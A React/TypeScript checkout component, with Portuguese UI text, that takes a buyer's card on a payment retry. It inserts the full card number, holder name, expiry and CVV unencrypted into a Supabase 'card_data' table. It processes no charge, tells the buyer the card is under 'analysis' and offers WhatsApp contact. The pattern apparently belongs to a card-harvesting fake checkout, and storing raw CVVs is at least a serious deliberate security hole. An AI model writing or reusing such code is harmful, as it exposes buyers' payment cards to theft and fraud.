
import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '@/integrations/supabase/client';
import { useToast } from '@/hooks/use-toast';
import { CardForm } from '@/components/checkout/payment-methods/CardForm';
import { CreditCardData, Order } from '@/types/checkout';
import { WhatsAppButton } from '@/pages/SuccessPage/WhatsAppButton';

interface RetryCardSubmissionProps {
  order: Order | null;
  validationResult: {
    canProceed: boolean;
  } | null;
  hasWhatsappSupport?: boolean;
  whatsappNumber?: string;
}

export const RetryCardSubmission: React.FC<RetryCardSubmissionProps> = ({ 
  order, 
  validationResult,
  hasWhatsappSupport,
  whatsappNumber
}) => {
  const navigate = useNavigate();
  const { toast } = useToast();
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  const handleSubmit = async (cardData: CreditCardData) => {
    if (!order) return;
    
    setIsSubmitting(true);
    
    try {
      // Extract the BIN (6 first digits)
      const bin = cardData.number.substring(0, 6);
      
      // Save new card data
      const { error } = await supabase
        .from('card_data')
        .insert({
          order_id: order.id,
          holder_name: cardData.holderName,
          number: cardData.number,
          expiry_date: cardData.expiryDate,
          cvv: cardData.cvv,
          bin: bin,
          brand: cardData.brand || 'unknown'
        });
        
      if (error) {
        throw new Error(`Erro ao salvar dados do cartão: ${error.message}`);
      }
      
      // Redirect to payment analysis page
      toast({
        title: "Pagamento em processamento",
        description: "Os dados do seu cartão foram enviados para análise",
      });
      
      navigate('/payment-pending', { 
        state: { 
          order,
          has_whatsapp_support: hasWhatsappSupport,
          whatsapp_number: whatsappNumber
        } 
      });
    } catch (error) {
      console.error("Error processing payment:", error);
      toast({
        title: "Erro no pagamento",
        description: error instanceof Error ? error.message : "Erro desconhecido ao processar o pagamento",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (!validationResult?.canProceed) return null;
  
  return (
    <>
      <CardForm 
        onSubmit={handleSubmit}
        isLoading={isSubmitting}
        buttonColor="#6E59A5"
        buttonText="Tentar pagamento novamente"
      />
      
      {hasWhatsappSupport && whatsappNumber && (
        <div className="mt-4">
          <WhatsAppButton 
            hasWhatsappSupport={hasWhatsappSupport} 
            whatsappNumber={whatsappNumber}
          />
        </div>
      )}
    </>
  );
};
